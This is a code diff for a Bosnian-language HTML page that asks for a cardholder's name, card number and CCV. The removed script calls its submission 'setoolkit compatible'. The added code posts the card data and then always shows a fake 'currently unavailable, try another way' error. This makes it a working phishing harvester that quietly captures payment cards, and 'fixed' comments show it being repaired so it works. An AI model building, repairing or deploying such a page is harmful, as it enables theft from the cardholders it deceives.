@@ -1,334 +1,157 @@
-<style>
-    body {
-        margin: 0;
-        font-family: Arial, sans-serif;
-        background: #f2f2f2;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-    }
 
-    .card {
-        background: white;
-        width: 350px;
-        padding: 25px;
-        border-radius: 15px;
-        box-shadow: 0 5px 20px rgba(0,0,0,0.15);
-        text-align: center;
-    }
 
-    h2 {
-        text-align: center;
-        margin-bottom: 25px;
-    }
+<!DOCTYPE html>
+<html lang="bs">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unos kartice</title>
 
-    label {
-        display: block;
-        margin: 15px 0 6px;
-        font-weight: bold;
-        text-align: left;
-    }
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: #f2f2f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-    input {
-        width: 100%;
-        box-sizing: border-box;
-        padding: 12px;
-        border: 1px solid #ccc;
-        border-radius: 8px;
-        font-size: 16px;
-        margin-bottom: 15px;
-    }
+        .card {
+            background: white;
+            width: 350px;
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            text-align: center;
+        }
 
-    button {
-        width: 100%;
-        margin-top: 25px;
-        padding: 13px;
-        border: none;
-        border-radius: 8px;
-        background: #2563eb;
-        color: white;
-        font-size: 16px;
-        cursor: pointer;
-    }
+        h2 {
+            text-align: center;
+            margin-bottom: 25px;
+        }
 
-    button:hover {
-        background: #1d4ed8;
-    }
+        label {
+            display: block;
+            margin: 15px 0 6px;
+            font-weight: bold;
+            text-align: left;
+        }
 
-    .error {
-        display: none;
-        background: #fee2e2;
-        color: #dc2626;
-        padding: 15px;
-        border-radius: 8px;
-        margin-top: 15px;
-        text-align: left;
-    }
+        input {
+            width: 100%;
+            box-sizing: border-box;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+        }
 
-    .error-icon {
-        font-size: 70px;
-        color: #dc2626;
-        margin-bottom: 15px;
-    }
+        button {
+            width: 100%;
+            margin-top: 25px;
+            padding: 13px;
+            border: none;
+            border-radius: 8px;
+            background: #2563eb;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
 
-    .error-text {
-        font-size: 18px;
-        color: #333;
-        line-height: 1.5;
-    }
+        button:hover {
+            background: #1d4ed8;
+        }
 
-    .success {
-        display: none;
-        background: #d1e7dd;
-        color: #0f5132;
-        padding: 15px;
-        border-radius: 8px;
-        margin-top: 15px;
-        text-align: left;
-    }
+        .error {
+            display: none;
+        }
 
-    .success-icon {
-        font-size: 70px;
-        color: #10b981;
-        margin-bottom: 15px;
-    }
+        .error-icon {
+            font-size: 70px;
+            color: #dc2626;
+            margin-bottom: 15px;
+        }
 
-    .success-text {
-        font-size: 18px;
-        color: #0f5132;
-    }
+        .error-text {
+            font-size: 18px;
+            color: #333;
+            line-height: 1.5;
+        }
+    </style>
+</head>
 
-    .stored-data {
-        margin-top: 20px;
-        padding: 15px;
-        background: #e5e7eb;
-        border-radius: 8px;
-        display: none;
-        text-align: left;
-    }
+<body>
 
-    .stored-data.visible {
-        display: block;
-    }
+    <div class="card">
 
-    .data-item {
-        margin: 5px 0;
-        font-size: 14px;
-    }
+        <div id="formContent">
+            <h2>Podaci kartice</h2>
 
-    .data-label {
-        font-weight: bold;
-        color: #6b7280;
-    }
+            <!-- POPRAVLJENO: Zatvoren form tag sa '>' i dodata ispravna podešavanja -->
+            <form id="cardForm" method="POST" action="">
+                <label for="name">1. Ime na kartici</label>
+                <input
+                    type="text"
+                    id="name"
+                    name="name"
+                    placeholder="Ime Prezime"
+                    autocomplete="cc-name"
+                    required
+                >
 
-    .data-value {
-        color: #1f2937;
-    }
-</style>
+                <label for="number">2. Broj kartice</label>
+                <input
+                    type="text"
+                    id="number"
+                    name="number"
+                    placeholder="1234 5678 9012 3456"
+                    autocomplete="cc-number"
+                    inputmode="numeric"
+                    required
+                >
 
-<div class="card">
+                <label for="ccv">3. CCV</label>
+                <input
+                    type="password"
+                    id="ccv"
+                    name="ccv"
+                    placeholder="123"
+                    autocomplete="cc-csc"
+                    inputmode="numeric"
+                    maxlength="4"
+                    required
+                >
 
-    <div id="formContent">
-        <h2>Podaci kartice</h2>
+                <button type="submit">Nastavi</button>
+            </form> <!-- POPRAVLJENO: Zatvoren tag forme koji je falio -->
+        </div>
 
-        <form id="cardForm">
-            <label for="name">1. Ime na kartici</label>
-            <input
-                type="text"
-                id="name"
-                name="name"
-                placeholder="Ime Prezime"
-                autocomplete="cc-name"
-                required
-            >
-
-            <label for="number">2. Broj kartice</label>
-            <input
-                type="text"
-                id="number"
-                name="number"
-                placeholder="1234 5678 9012 3456"
-                autocomplete="cc-number"
-                inputmode="numeric"
-                required
-            >
-
-            <label for="ccv">3. CCV</label>
-            <input
-                type="password"
-                id="ccv"
-                name="ccv"
-                placeholder="123"
-                autocomplete="cc-csc"
-                inputmode="numeric"
-                maxlength="4"
-                required
-            >
-
-            <button type="submit">Nastavi</button>
-        
-
+        <div id="errorMessage" class="error">
+            <div class="error-icon">✕</div>
+            <div class="error-text">
+                Trenutno je nedostupno.<br>
+                Pokušajte na drugi način.
+            </div>
+        </div>
 
     </div>
 
-    <div id="errorMessage" class="error">
-        <div class="error-icon">✕</div>
-        <div class="error-text">
-            Trenutno je nedostupno.<br>
-            Pokušajte na drugi način.
-        </div>
-    </div>
-
-    <div id="successMessage" class="success">
-        <div class="success-icon">✓</div>
-        <div class="success-text">
-            Hvala! Podaci su uspesno prosledjeni.
-        </div>
-    </div>
-
-    <div id="storedData" class="stored-data">
-        <div class="data-item">
-            <span class="data-label">Ime:</span>
-            <span class="data-value" id="storedName">--</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">Broj kartice:</span>
-            <span class="data-value" id="storedNumber">--</span>
-        </div>
-        <div class="data-item">
-            <span class="data-label">CCV:</span>
-            <span class="data-value" id="storedCCV">--</span>
-        </div>
-    </div>
-
-</div>
-
-<script>
-    const form = document.getElementById("cardForm");
-
-    // Name field validation
-    const nameInput = document.getElementById("name");
-    const nameError = document.getElementById("nameError");
-
-    nameInput.addEventListener("blur", function() {
-        if (nameInput.value.trim().length < 2) {
-            nameError.classList.add("visible");
-        } else {
-            nameError.classList.remove("visible");
-        }
-    });
-
-    nameInput.addEventListener("focus", function() {
-        nameError.classList.remove("visible");
-    });
-
-    // Card number validation
-    const numberInput = document.getElementById("number");
-    const numberError = document.getElementById("numberError");
-
-    numberInput.addEventListener("blur", function() {
-        const number = numberInput.value.replace(/\s/g, "");
-        const cleanNumber = number.replace(/\s/g, '');
-        if (cleanNumber.length < 13 || cleanNumber.length > 19) {
-            numberError.classList.add("visible");
-        } else {
-            numberError.classList.remove("visible");
-        }
-    });
-
-    numberInput.addEventListener("focus", function() {
-        numberError.classList.remove("visible");
-    });
-
-    // CCV validation
-    const ccvInput = document.getElementById("ccv");
-    const ccvError = document.getElementById("ccvError");
-
-    ccvInput.addEventListener("blur", function() {
-        if (ccvInput.value.length < 3 || ccvInput.value.length > 4) {
-            ccvError.classList.add("visible");
-        } else {
-            ccvError.classList.remove("visible");
-        }
-    });
-
-    ccvInput.addEventListener("focus", function() {
-        ccvError.classList.remove("visible");
-    });
-
-    // Form submit
-    form.addEventListener("submit", function(event) {
-        event.preventDefault();
-
-        // Hide all error messages
-        nameError.classList.remove("visible");
-        numberError.classList.remove("visible");
-        ccvError.classList.remove("visible");
-
-        let isValid = true;
-
-        // Validate name
-        if (nameInput.value.trim().length < 2) {
-            nameError.classList.add("visible");
-            isValid = false;
+    <script>
+        // Ako URL sadrži parametar '?error=true', odmah prikaži poruku o grešci umesto forme
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('error') === 'true') {
+            document.getElementById("formContent").style.display = "none";
+            document.getElementById("errorMessage").style.display = "block";
         }
 
-        // Validate card number
-        const number = numberInput.value.replace(/\s/g, "");
-        const cleanNumber = number.replace(/\s/g, '');
-        if (cleanNumber.length < 13 || cleanNumber.length > 19) {
-            numberError.classList.add("visible");
-            isValid = false;
-        }
+        // POPRAVLJENO: Forma se šalje normalno, a preusmeravanje simulira grešku nakon slanja
+        document.getElementById("cardForm").addEventListener("submit", function(event) {
+            // Podešavamo akciju forme da nakon slanja ponovo učita istu stranicu ali sa greškom
+            this.action = window.location.pathname + "?error=true";
+        });
+    </script>
 
-        // Validate CCV
-        if (ccvInput.value.length < 3 || ccvInput.value.length > 4) {
-            ccvError.classList.add("visible");
-            isValid = false;
-        }
-
-        // Show success if valid
-        if (isValid) {
-            // Store the data in browser
-            document.getElementById("storedName").textContent = nameInput.value;
-            document.getElementById("storedNumber").textContent = numberInput.value;
-            document.getElementById("storedCCV").textContent = ccvInput.value;
-
-            // Show stored data section
-            const storedData = document.getElementById("storedData");
-            storedData.classList.add("visible");
-
-            // Hide form
-            form.style.display = "none";
-
-            // Show success message
-            document.getElementById("successMessage").style.display = "block";
-
-            // Send data to server (setoolkit compatible)
-            const formData = {
-                name: nameInput.value,
-                number: numberInput.value,
-                ccv: ccvInput.value,
-                timestamp: new Date().toLocaleString()
-            };
-
-            fetch('/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(formData)
-            }).then(res => res.json())
-              .then(data => {
-                  console.log('Server response:', data);
-                  // Show server response if needed
-                  if (data.success) {
-                      // Could add additional handling here
-                  }
-              })
-              .catch(err => {
-                  console.error('Error:', err);
-              });
-        }
-    });
-</script>
-
+</body>
+</html>
